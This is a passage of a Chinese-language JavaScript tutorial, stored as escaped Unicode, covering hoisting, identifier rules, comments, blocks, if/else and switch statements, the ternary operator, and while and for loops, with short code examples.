\u8fd8\u6ca1\u6709\u58f0\u660e\u548c\u8d4b\u503c\uff0c\u6240\u4ee5\u8fd9\u662f\u4e00\u79cd\u9519\u8bef\u7684\u505a\u6cd5\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u4e0d\u4f1a\u62a5\u9519\u3002\u56e0\u4e3a\u5b58\u5728\u53d8\u91cf\u63d0\u5347\uff0c\u771f\u6b63\u8fd0\u884c\u7684\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 var a ; console . log ( a ); a = 1 ; \u6700\u540e\u7684\u7ed3\u679c\u662f\u663e\u793a undefined \uff0c\u8868\u793a\u53d8\u91cf a \u5df2\u58f0\u660e\uff0c\u4f46\u8fd8\u672a\u8d4b\u503c\u3002 \u6807\u8bc6\u7b26 \u00b6 \u6807\u8bc6\u7b26\uff08identifier\uff09\u6307\u7684\u662f\u7528\u6765\u8bc6\u522b\u5404\u79cd\u503c\u7684\u5408\u6cd5\u540d\u79f0\u3002\u6700\u5e38\u89c1\u7684\u6807\u8bc6\u7b26\u5c31\u662f\u53d8\u91cf\u540d\uff0c\u4ee5\u53ca\u540e\u9762\u8981\u63d0\u5230\u7684\u51fd\u6570\u540d\u3002JavaScript \u8bed\u8a00\u7684\u6807\u8bc6\u7b26\u5bf9\u5927\u5c0f\u5199\u654f\u611f\uff0c\u6240\u4ee5 a \u548c A \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6807\u8bc6\u7b26\u3002 \u6807\u8bc6\u7b26\u6709\u4e00\u5957\u547d\u540d\u89c4\u5219\uff0c\u4e0d\u7b26\u5408\u89c4\u5219\u7684\u5c31\u662f\u975e\u6cd5\u6807\u8bc6\u7b26\u3002JavaScript \u5f15\u64ce\u9047\u5230\u975e\u6cd5\u6807\u8bc6\u7b26\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 \u7b80\u5355\u8bf4\uff0c\u6807\u8bc6\u7b26\u547d\u540d\u89c4\u5219\u5982\u4e0b\u3002 \u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u53ef\u4ee5\u662f\u4efb\u610f Unicode \u5b57\u6bcd\uff08\u5305\u62ec\u82f1\u6587\u5b57\u6bcd\u548c\u5176\u4ed6\u8bed\u8a00\u7684\u5b57\u6bcd\uff09\uff0c\u4ee5\u53ca\u7f8e\u5143\u7b26\u53f7\uff08 $ \uff09\u548c\u4e0b\u5212\u7ebf\uff08 _ \uff09\u3002 \u7b2c\u4e8c\u4e2a\u5b57\u7b26\u53ca\u540e\u9762\u7684\u5b57\u7b26\uff0c\u9664\u4e86 Unicode \u5b57\u6bcd\u3001\u7f8e\u5143\u7b26\u53f7\u548c\u4e0b\u5212\u7ebf\uff0c\u8fd8\u53ef\u4ee5\u7528\u6570\u5b57 0-9 \u3002 \u4e0b\u9762\u8fd9\u4e9b\u90fd\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\u3002 1 2 3 4 arg0 _tmp $elem \u03c0 \u4e0b\u9762\u8fd9\u4e9b\u5219\u662f\u4e0d\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\u3002 1 2 3 4 5 1 a // \u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u662f\u6570\u5b57 23 // \u540c\u4e0a *** // \u6807\u8bc6\u7b26\u4e0d\u80fd\u5305\u542b\u661f\u53f7 a + b // \u6807\u8bc6\u7b26\u4e0d\u80fd\u5305\u542b\u52a0\u53f7 - d // \u6807\u8bc6\u7b26\u4e0d\u80fd\u5305\u542b\u51cf\u53f7\u6216\u8fde\u8bcd\u7ebf \u4e2d\u6587\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u4ee5\u7528\u4f5c\u53d8\u91cf\u540d\u3002 1 var \u4e34\u65f6\u53d8\u91cf = 1 ; JavaScript \u6709\u4e00\u4e9b\u4fdd\u7559\u5b57\uff0c\u4e0d\u80fd\u7528\u4f5c\u6807\u8bc6\u7b26\uff1aarguments\u3001break\u3001case\u3001catch\u3001class\u3001const\u3001continue\u3001debugger\u3001default\u3001delete\u3001do\u3001else\u3001enum\u3001eval\u3001export\u3001extends\u3001false\u3001finally\u3001for\u3001function\u3001if\u3001implements\u3001import\u3001in\u3001instanceof\u3001interface\u3001let\u3001new\u3001null\u3001package\u3001private\u3001protected\u3001public\u3001return\u3001static\u3001super\u3001switch\u3001this\u3001throw\u3001true\u3001try\u3001typeof\u3001var\u3001void\u3001while\u3001with\u3001yield\u3002 \u6ce8\u91ca \u00b6 \u6e90\u7801\u4e2d\u88ab JavaScript \u5f15\u64ce\u5ffd\u7565\u7684\u90e8\u5206\u5c31\u53eb\u505a\u6ce8\u91ca\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u5bf9\u4ee3\u7801\u8fdb\u884c\u89e3\u91ca\u3002JavaScript \u63d0\u4f9b\u4e24\u79cd\u6ce8\u91ca\u7684\u5199\u6cd5\uff1a\u4e00\u79cd\u662f\u5355\u884c\u6ce8\u91ca\uff0c\u7528 // \u8d77\u5934\uff1b\u53e6\u4e00\u79cd\u662f\u591a\u884c\u6ce8\u91ca\uff0c\u653e\u5728 /* \u548c */ \u4e4b\u95f4\u3002 1 2 3 4 5 6 7 // \u8fd9\u662f\u5355\u884c\u6ce8\u91ca /* \u8fd9\u662f \u591a\u884c \u6ce8\u91ca */ \u6b64\u5916\uff0c\u7531\u4e8e\u5386\u53f2\u4e0a JavaScript \u53ef\u4ee5\u517c\u5bb9 HTML \u4ee3\u7801\u7684\u6ce8\u91ca\uff0c\u6240\u4ee5 <!-- \u548c --> \u4e5f\u88ab\u89c6\u4e3a\u5408\u6cd5\u7684\u5355\u884c\u6ce8\u91ca\u3002 1 2 x = 1 ; <!-- x = 2 ; --> x = 3 ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709 x = 1 \u4f1a\u6267\u884c\uff0c\u5176\u4ed6\u7684\u90e8\u5206\u90fd\u88ab\u6ce8\u91ca\u6389\u4e86\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c --> \u53ea\u6709\u5728\u884c\u9996\uff0c\u624d\u4f1a\u88ab\u5f53\u6210\u5355\u884c\u6ce8\u91ca\uff0c\u5426\u5219\u4f1a\u5f53\u4f5c\u6b63\u5e38\u7684\u8fd0\u7b97\u3002 1 2 3 4 5 6 7 function countdown ( n ) { while ( n --> 0 ) console . log ( n ); } countdown ( 3 ) // 2 // 1 // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c n --> 0 \u5b9e\u9645\u4e0a\u4f1a\u5f53\u4f5c n-- > 0 \uff0c\u56e0\u6b64\u8f93\u51fa2\u30011\u30010\u3002 \u533a\u5757 \u00b6 JavaScript \u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u5c06\u591a\u4e2a\u76f8\u5173\u7684\u8bed\u53e5\u7ec4\u5408\u5728\u4e00\u8d77\uff0c\u79f0\u4e3a\u201c\u533a\u5757\u201d\uff08block\uff09\u3002 \u5bf9\u4e8e var \u547d\u4ee4\u6765\u8bf4\uff0cJavaScript \u7684\u533a\u5757\u4e0d\u6784\u6210\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff08scope\uff09\u3002 1 2 3 4 5 { var a = 1 ; } a // 1 \u4e0a\u9762\u4ee3\u7801\u5728\u533a\u5757\u5185\u90e8\uff0c\u4f7f\u7528 var \u547d\u4ee4\u58f0\u660e\u5e76\u8d4b\u503c\u4e86\u53d8\u91cf a \uff0c\u7136\u540e\u5728\u533a\u5757\u5916\u90e8\uff0c\u53d8\u91cf a \u4f9d\u7136\u6709\u6548\uff0c\u533a\u5757\u5bf9\u4e8e var \u547d\u4ee4\u4e0d\u6784\u6210\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff0c\u4e0e\u4e0d\u4f7f\u7528\u533a\u5757\u7684\u60c5\u51b5\u6ca1\u6709\u4efb\u4f55\u533a\u522b\u3002\u5728 JavaScript \u8bed\u8a00\u4e2d\uff0c\u5355\u72ec\u4f7f\u7528\u533a\u5757\u5e76\u4e0d\u5e38\u89c1\uff0c\u533a\u5757\u5f80\u5f80\u7528\u6765\u6784\u6210\u5176\u4ed6\u66f4\u590d\u6742\u7684\u8bed\u6cd5\u7ed3\u6784\uff0c\u6bd4\u5982 for \u3001 if \u3001 while \u3001 function \u7b49\u3002 \u6761\u4ef6\u8bed\u53e5 \u00b6 JavaScript \u63d0\u4f9b if \u7ed3\u6784\u548c switch \u7ed3\u6784\uff0c\u5b8c\u6210\u6761\u4ef6\u5224\u65ad\uff0c\u5373\u53ea\u6709\u6ee1\u8db3\u9884\u8bbe\u7684\u6761\u4ef6\uff0c\u624d\u4f1a\u6267\u884c\u76f8\u5e94\u7684\u8bed\u53e5\u3002 if \u7ed3\u6784 \u00b6 if \u7ed3\u6784\u5148\u5224\u65ad\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\uff0c\u7136\u540e\u6839\u636e\u5e03\u5c14\u503c\u7684\u771f\u4f2a\uff0c\u6267\u884c\u4e0d\u540c\u7684\u8bed\u53e5\u3002\u6240\u8c13\u5e03\u5c14\u503c\uff0c\u6307\u7684\u662f JavaScript \u7684\u4e24\u4e2a\u7279\u6b8a\u503c\uff0c true \u8868\u793a\u201c\u771f\u201d\uff0c false \u8868\u793a\u201c\u4f2a\u201d\u3002 1 2 3 4 5 if ( \u5e03\u5c14\u503c ) \u8bed\u53e5 ; // \u6216\u8005 if ( \u5e03\u5c14\u503c ) \u8bed\u53e5 ; \u4e0a\u9762\u662f if \u7ed3\u6784\u7684\u57fa\u672c\u5f62\u5f0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u201c\u5e03\u5c14\u503c\u201d\u5f80\u5f80\u7531\u4e00\u4e2a\u6761\u4ef6\u8868\u8fbe\u5f0f\u4ea7\u751f\u7684\uff0c\u5fc5\u987b\u653e\u5728\u5706\u62ec\u53f7\u4e2d\uff0c\u8868\u793a\u5bf9\u8868\u8fbe\u5f0f\u6c42\u503c\u3002\u5982\u679c\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u7ed3\u679c\u4e3a true \uff0c\u5c31\u6267\u884c\u7d27\u8ddf\u5728\u540e\u9762\u7684\u8bed\u53e5\uff1b\u5982\u679c\u7ed3\u679c\u4e3a false \uff0c\u5219\u8df3\u8fc7\u7d27\u8ddf\u5728\u540e\u9762\u7684\u8bed\u53e5\u3002 1 2 if ( m === 3 ) m = m + 1 ; \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u53ea\u6709\u5728 m \u7b49\u4e8e3\u65f6\uff0c\u624d\u4f1a\u5c06\u5176\u503c\u52a0\u4e0a1\u3002 \u8fd9\u79cd\u5199\u6cd5\u8981\u6c42\u6761\u4ef6\u8868\u8fbe\u5f0f\u540e\u9762\u53ea\u80fd\u6709\u4e00\u4e2a\u8bed\u53e5\u3002\u5982\u679c\u60f3\u6267\u884c\u591a\u4e2a\u8bed\u53e5\uff0c\u5fc5\u987b\u5728 if \u7684\u6761\u4ef6\u5224\u65ad\u4e4b\u540e\uff0c\u52a0\u4e0a\u5927\u62ec\u53f7\uff0c\u8868\u793a\u4ee3\u7801\u5757\uff08\u591a\u4e2a\u8bed\u53e5\u5408\u5e76\u6210\u4e00\u4e2a\u8bed\u53e5\uff09\u3002 1 2 3 if ( m === 3 ) { m += 1 ; } \u5efa\u8bae\u603b\u662f\u5728 if \u8bed\u53e5\u4e2d\u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u56e0\u4e3a\u8fd9\u6837\u65b9\u4fbf\u63d2\u5165\u8bed\u53e5\u3002 \u6ce8\u610f\uff0c if \u540e\u9762\u7684\u8868\u8fbe\u5f0f\u4e4b\u4e2d\uff0c\u4e0d\u8981\u6df7\u6dc6\u8d4b\u503c\u8868\u8fbe\u5f0f\uff08 = \uff09\u3001\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u548c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u3002\u5c24\u5176\u662f\u8d4b\u503c\u8868\u8fbe\u5f0f\u4e0d\u5177\u6709\u6bd4\u8f83\u4f5c\u7528\u3002 1 2 3 4 5 6 var x = 1 ; var y = 2 ; if ( x = y ) { console . log ( x ); } // \"2\" \u4e0a\u9762\u4ee3\u7801\u7684\u539f\u610f\u662f\uff0c\u5f53 x \u7b49\u4e8e y \u7684\u65f6\u5019\uff0c\u624d\u6267\u884c\u76f8\u5173\u8bed\u53e5\u3002\u4f46\u662f\uff0c\u4e0d\u5c0f\u5fc3\u5c06\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u5199\u6210\u8d4b\u503c\u8868\u8fbe\u5f0f\uff0c\u7ed3\u679c\u53d8\u6210\u4e86\u5c06 y \u8d4b\u503c\u7ed9\u53d8\u91cf x \uff0c\u518d\u5224\u65ad\u53d8\u91cf x \u7684\u503c\uff08\u7b49\u4e8e2\uff09\u7684\u5e03\u5c14\u503c\uff08\u7ed3\u679c\u4e3a true \uff09\u3002 \u8fd9\u79cd\u9519\u8bef\u53ef\u4ee5\u6b63\u5e38\u751f\u6210\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u56e0\u800c\u4e0d\u4f1a\u62a5\u9519\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u6709\u4e9b\u5f00\u53d1\u8005\u4e60\u60ef\u5c06\u5e38\u91cf\u5199\u5728\u8fd0\u7b97\u7b26\u7684\u5de6\u8fb9\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u4e00\u65e6\u4e0d\u5c0f\u5fc3\u5c06\u76f8\u7b49\u8fd0\u7b97\u7b26\u5199\u6210\u8d4b\u503c\u8fd0\u7b97\u7b26\uff0c\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5e38\u91cf\u4e0d\u80fd\u88ab\u8d4b\u503c\u3002 1 2 if ( x = 2 ) { // \u4e0d\u62a5\u9519 if ( 2 = x ) { // \u62a5\u9519 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f18\u5148\u91c7\u7528\u201c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 === \uff09\uff0c\u800c\u4e0d\u662f\u201c\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 == \uff09\uff0c\u8bf7\u53c2\u8003\u300a\u8fd0\u7b97\u7b26\u300b\u7ae0\u8282\u3002 if...else \u7ed3\u6784 \u00b6 if \u4ee3\u7801\u5757\u540e\u9762\uff0c\u8fd8\u53ef\u4ee5\u8ddf\u4e00\u4e2a else \u4ee3\u7801\u5757\uff0c\u8868\u793a\u4e0d\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u6240\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002 1 2 3 4 5 if ( m === 3 ) { // \u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u6267\u884c\u7684\u8bed\u53e5 } else { // \u4e0d\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u6267\u884c\u7684\u8bed\u53e5 } \u4e0a\u9762\u4ee3\u7801\u5224\u65ad\u53d8\u91cf m \u662f\u5426\u7b49\u4e8e3\uff0c\u5982\u679c\u7b49\u4e8e\u5c31\u6267\u884c if \u4ee3\u7801\u5757\uff0c\u5426\u5219\u6267\u884c else \u4ee3\u7801\u5757\u3002 \u5bf9\u540c\u4e00\u4e2a\u53d8\u91cf\u8fdb\u884c\u591a\u6b21\u5224\u65ad\u65f6\uff0c\u591a\u4e2a if...else \u8bed\u53e5\u53ef\u4ee5\u8fde\u5199\u5728\u4e00\u8d77\u3002 1 2 3 4 5 6 7 8 9 if ( m === 0 ) { // ... } else if ( m === 1 ) { // ... } else if ( m === 2 ) { // ... } else { // ... } else \u4ee3\u7801\u5757\u603b\u662f\u4e0e\u79bb\u81ea\u5df1\u6700\u8fd1\u7684\u90a3\u4e2a if \u8bed\u53e5\u914d\u5bf9\u3002 1 2 3 4 5 6 var m = 1 ; var n = 2 ; if ( m !== 1 ) if ( n === 2 ) console . log ( 'hello' ); else console . log ( 'world' ); \u4e0a\u9762\u4ee3\u7801\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\uff0c else \u4ee3\u7801\u5757\u4e0d\u4f1a\u5f97\u5230\u6267\u884c\uff0c\u56e0\u4e3a\u5b83\u8ddf\u7740\u7684\u662f\u6700\u8fd1\u7684\u90a3\u4e2a if \u8bed\u53e5\uff0c\u76f8\u5f53\u4e8e\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 if ( m !== 1 ) { if ( n === 2 ) { console . log ( 'hello' ); } else { console . log ( 'world' ); } } \u5982\u679c\u60f3\u8ba9 else \u4ee3\u7801\u5757\u8ddf\u968f\u6700\u4e0a\u9762\u7684\u90a3\u4e2a if \u8bed\u53e5\uff0c\u5c31\u8981\u6539\u53d8\u5927\u62ec\u53f7\u7684\u4f4d\u7f6e\u3002 1 2 3 4 5 6 7 8 if ( m !== 1 ) { if ( n === 2 ) { console . log ( 'hello' ); } } else { console . log ( 'world' ); } // world switch \u7ed3\u6784 \u00b6 \u591a\u4e2a if...else \u8fde\u5728\u4e00\u8d77\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u8f6c\u4e3a\u4f7f\u7528\u66f4\u65b9\u4fbf\u7684 switch \u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 switch ( fruit ) { case \"banana\" : // ... break ; case \"apple\" : // ... break ; default : // ... } \u4e0a\u9762\u4ee3\u7801\u6839\u636e\u53d8\u91cf fruit \u7684\u503c\uff0c\u9009\u62e9\u6267\u884c\u76f8\u5e94\u7684 case \u3002\u5982\u679c\u6240\u6709 case \u90fd\u4e0d\u7b26\u5408\uff0c\u5219\u6267\u884c\u6700\u540e\u7684 default \u90e8\u5206\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u4e2a case \u4ee3\u7801\u5757\u5185\u90e8\u7684 break \u8bed\u53e5\u4e0d\u80fd\u5c11\uff0c\u5426\u5219\u4f1a\u63a5\u4e0b\u53bb\u6267\u884c\u4e0b\u4e00\u4e2a case \u4ee3\u7801\u5757\uff0c\u800c\u4e0d\u662f\u8df3\u51fa switch \u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var x = 1 ; switch ( x ) { case 1 : console . log ( 'x \u7b49\u4e8e1' ); case 2 : console . log ( 'x \u7b49\u4e8e2' ); default : console . log ( 'x \u7b49\u4e8e\u5176\u4ed6\u503c' ); } // x\u7b49\u4e8e1 // x\u7b49\u4e8e2 // x\u7b49\u4e8e\u5176\u4ed6\u503c \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c case \u4ee3\u7801\u5757\u4e4b\u4e2d\u6ca1\u6709 break \u8bed\u53e5\uff0c\u5bfc\u81f4\u4e0d\u4f1a\u8df3\u51fa switch \u7ed3\u6784\uff0c\u800c\u4f1a\u4e00\u76f4\u6267\u884c\u4e0b\u53bb\u3002\u6b63\u786e\u7684\u5199\u6cd5\u662f\u50cf\u4e0b\u9762\u8fd9\u6837\u3002 1 2 3 4 5 6 7 8 9 10 switch ( x ) { case 1 : console . log ( 'x \u7b49\u4e8e1' ); break ; case 2 : console . log ( 'x \u7b49\u4e8e2' ); break ; default : console . log ( 'x \u7b49\u4e8e\u5176\u4ed6\u503c' ); } switch \u8bed\u53e5\u90e8\u5206\u548c case \u8bed\u53e5\u90e8\u5206\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u3002 1 2 3 4 5 6 7 switch ( 1 + 3 ) { case 2 + 2 : f (); break ; default : neverHappens (); } \u4e0a\u9762\u4ee3\u7801\u7684 default \u90e8\u5206\uff0c\u662f\u6c38\u8fdc\u4e0d\u4f1a\u6267\u884c\u5230\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c switch \u8bed\u53e5\u540e\u9762\u7684\u8868\u8fbe\u5f0f\uff0c\u4e0e case \u8bed\u53e5\u540e\u9762\u7684\u8868\u793a\u5f0f\u6bd4\u8f83\u8fd0\u884c\u7ed3\u679c\u65f6\uff0c\u91c7\u7528\u7684\u662f\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\uff0c\u800c\u4e0d\u662f\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\uff0c\u8fd9\u610f\u5473\u7740\u6bd4\u8f83\u65f6\u4e0d\u4f1a\u53d1\u751f\u7c7b\u578b\u8f6c\u6362\u3002 1 2 3 4 5 6 7 8 9 10 var x = 1 ; switch ( x ) { case true : console . log ( 'x \u53d1\u751f\u7c7b\u578b\u8f6c\u6362' ); break ; default : console . log ( 'x \u6ca1\u6709\u53d1\u751f\u7c7b\u578b\u8f6c\u6362' ); } // x \u6ca1\u6709\u53d1\u751f\u7c7b\u578b\u8f6c\u6362 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u53d8\u91cf x \u6ca1\u6709\u53d1\u751f\u7c7b\u578b\u8f6c\u6362\uff0c\u6240\u4ee5\u4e0d\u4f1a\u6267\u884c case true \u7684\u60c5\u51b5\u3002\u8fd9\u8868\u660e\uff0c switch \u8bed\u53e5\u5185\u90e8\u91c7\u7528\u7684\u662f\u201c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff0c\u8be6\u7ec6\u89e3\u91ca\u8bf7\u53c2\u8003\u300a\u8fd0\u7b97\u7b26\u300b\u4e00\u8282\u3002 \u4e09\u5143\u8fd0\u7b97\u7b26 ?: \u00b6 JavaScript \u8fd8\u6709\u4e00\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\uff08\u5373\u8be5\u8fd0\u7b97\u7b26\u9700\u8981\u4e09\u4e2a\u8fd0\u7b97\u5b50\uff09 ?: \uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u903b\u8f91\u5224\u65ad\u3002 1 ( \u6761\u4ef6 ) ? \u8868\u8fbe\u5f0f1 : \u8868\u8fbe\u5f0f2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u201c\u6761\u4ef6\u201d\u4e3a true \uff0c\u5219\u8fd4\u56de\u201c\u8868\u8fbe\u5f0f1\u201d\u7684\u503c\uff0c\u5426\u5219\u8fd4\u56de\u201c\u8868\u8fbe\u5f0f2\u201d\u7684\u503c\u3002 1 var even = ( n % 2 === 0 ) ? true : false ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c n \u53ef\u4ee5\u88ab2\u6574\u9664\uff0c\u5219 even \u7b49\u4e8e true \uff0c\u5426\u5219\u7b49\u4e8e false \u3002\u5b83\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5f62\u5f0f\u3002 1 2 3 4 5 6 var even ; if ( n % 2 === 0 ) { even = true ; } else { even = false ; } \u8fd9\u4e2a\u4e09\u5143\u8fd0\u7b97\u7b26\u53ef\u4ee5\u88ab\u89c6\u4e3a if...else... \u7684\u7b80\u5199\u5f62\u5f0f\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u591a\u79cd\u573a\u5408\u3002 1 2 3 4 5 6 7 var myVar ; console . log ( myVar ? 'myVar has a value' : 'myVar does not have a value' ) // myVar does not have a value \u4e0a\u9762\u4ee3\u7801\u5229\u7528\u4e09\u5143\u8fd0\u7b97\u7b26\uff0c\u8f93\u51fa\u76f8\u5e94\u7684\u63d0\u793a\u3002 1 var msg = '\u6570\u5b57' + n + '\u662f' + ( n % 2 === 0 ? '\u5076\u6570' : '\u5947\u6570' ); \u4e0a\u9762\u4ee3\u7801\u5229\u7528\u4e09\u5143\u8fd0\u7b97\u7b26\uff0c\u5728\u5b57\u7b26\u4e32\u4e4b\u4e2d\u63d2\u5165\u4e0d\u540c\u7684\u503c\u3002 \u5faa\u73af\u8bed\u53e5 \u00b6 \u5faa\u73af\u8bed\u53e5\u7528\u4e8e\u91cd\u590d\u6267\u884c\u67d0\u4e2a\u64cd\u4f5c\uff0c\u5b83\u6709\u591a\u79cd\u5f62\u5f0f\u3002 while \u5faa\u73af \u00b6 While \u8bed\u53e5\u5305\u62ec\u4e00\u4e2a\u5faa\u73af\u6761\u4ef6\u548c\u4e00\u6bb5\u4ee3\u7801\u5757\uff0c\u53ea\u8981\u6761\u4ef6\u4e3a\u771f\uff0c\u5c31\u4e0d\u65ad\u5faa\u73af\u6267\u884c\u4ee3\u7801\u5757\u3002 1 2 3 4 5 while ( \u6761\u4ef6 ) \u8bed\u53e5 ; // \u6216\u8005 while ( \u6761\u4ef6 ) \u8bed\u53e5 ; while \u8bed\u53e5\u7684\u5faa\u73af\u6761\u4ef6\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5fc5\u987b\u653e\u5728\u5706\u62ec\u53f7\u4e2d\u3002\u4ee3\u7801\u5757\u90e8\u5206\uff0c\u5982\u679c\u53ea\u6709\u4e00\u6761\u8bed\u53e5\uff0c\u53ef\u4ee5\u7701\u7565\u5927\u62ec\u53f7\uff0c\u5426\u5219\u5c31\u5fc5\u987b\u52a0\u4e0a\u5927\u62ec\u53f7\u3002 1 2 3 while ( \u6761\u4ef6 ) { \u8bed\u53e5 ; } \u4e0b\u9762\u662f while \u8bed\u53e5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 var i = 0 ; while ( i < 100 ) { console . log ( 'i \u5f53\u524d\u4e3a\uff1a' + i ); i = i + 1 ; } \u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u5faa\u73af100\u6b21\uff0c\u76f4\u5230 i \u7b49\u4e8e100\u4e3a\u6b62\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u4e00\u4e2a\u65e0\u9650\u5faa\u73af\uff0c\u56e0\u4e3a\u5faa\u73af\u6761\u4ef6\u603b\u662f\u4e3a\u771f\u3002 1 2 3 while ( true ) { console . log ( 'Hello, world' ); } for \u5faa\u73af \u00b6 for \u8bed\u53e5\u662f\u5faa\u73af\u547d\u4ee4\u7684\u53e6\u4e00\u79cd\u5f62\u5f0f\uff0c\u53ef\u4ee5\u6307\u5b9a\u5faa\u73af\u7684\u8d77\u70b9\u3001\u7ec8\u70b9\u548c\u7ec8\u6b62\u6761\u4ef6\u3002\u5b83\u7684\u683c\u5f0f\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 for ( \u521d\u59cb\u5316\u8868\u8fbe\u5f0f ; \u6761\u4ef6 ; \u9012\u589e\u8868\u8fbe\u5f0f ) \u8bed\u53e5 // \u6216\u8005 for ( \u521d\u59cb\u5316\u8868\u8fbe\u5f0f ; \u6761\u4ef6 ; \u9012\u589e\u8868\u8fbe\u5f0f ) { \u8bed\u53e5 } for \u8bed\u53e5\u540e\u9762\u7684\u62ec\u53f7\u91cc\u9762\uff0c\u6709\u4e09\u4e2a\u8868\u8fbe\u5f0f\u3002 \u521d\u59cb\u5316\u8868\u8fbe\u5f0f\uff08initialize\uff09\uff1a\u786e\u5b9a\u5faa\u73af\u53d8\u91cf\u7684\u521d\u59cb\u503c\uff0c\u53ea\u5728\u5faa\u73af\u5f00\u59cb\u65f6\u6267\u884c\u4e00\u6b21\u3002 \u6761\u4ef6\u8868\u8fbe\u5f0f\uff08test\uff09\uff1a\u6bcf\u8f6e\u5faa\u73af\u5f00\u59cb\u65f6\uff0c\u90fd\u8981\u6267\u884c\u8fd9\u4e2a\u6761\u4ef6\u8868\u8fbe\u5f0f\uff0c\u53ea\u6709\u503c\u4e3a\u771f\uff0c\u624d\u7ee7\u7eed\u8fdb\u884c\u5faa\u73af\u3002 \u9012\u589e\u8868\u8fbe\u5f0f\uff08increment\uff09\uff1a\u6bcf\u8f6e\u5faa\u73af\u7684\u6700\u540e\u4e00\u4e2a\u64cd\u4f5c\uff0c\u901a\u5e38\u7528\u6765\u9012\u589e\u5faa\u73af\u53d8\u91cf\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var x = 3 ; for ( var i = 0 ; i < x ; i ++ ) { console . log ( i ); } // 0 // 1 // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u521d\u59cb\u5316\u8868\u8fbe\u5f0f\u662f var i = 0 \uff0c\u5373\u521d\u59cb\u5316\u4e00\u4e2a\u53d8\u91cf i \uff1b\u6d4b\u8bd5\u8868\u8fbe\u5f0f\u662f i < x \uff0c\u5373\u53ea\u8981 i \u5c0f\u4e8e x \uff0c\u5c31\u4f1a\u6267\u884c\u5faa\u73af\uff1b\u9012\u589e\u8868\u8fbe\u5f0f\u662f i++ \uff0c\u5373\u6bcf\u6b21\u5faa\u73af\u7ed3\u675f\u540e\uff0c i \u589e\u59271\u3002 \u6240\u6709 for \u5faa\u73af\uff0c\u90fd\u53ef\u4ee5\u6539\u5199\u6210 while \u5faa\u73af\u3002\u4e0a\u9762\u7684\u4f8b\u5b50\u6539\u4e3a while \u5faa\u73af\uff0c\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 var x = 3 ; var i = 0 ; while ( i < x ) { console . log ( i ); i ++ ; } for \u8bed\u53e5\u7684\u4e09\u4e2a\u90e8\u5206\uff08initialize\u3001test\u3001increment\uff09\uff0c\u53ef\u4ee5\u7701\u7565\u4efb\u4f55\u4e00\u4e2a\uff0c\u4e5f\u53ef\u4ee5\u5168\u90e8\u7701\u7565\u3002 1 2 3 for ( ; ; ){ console . log ( 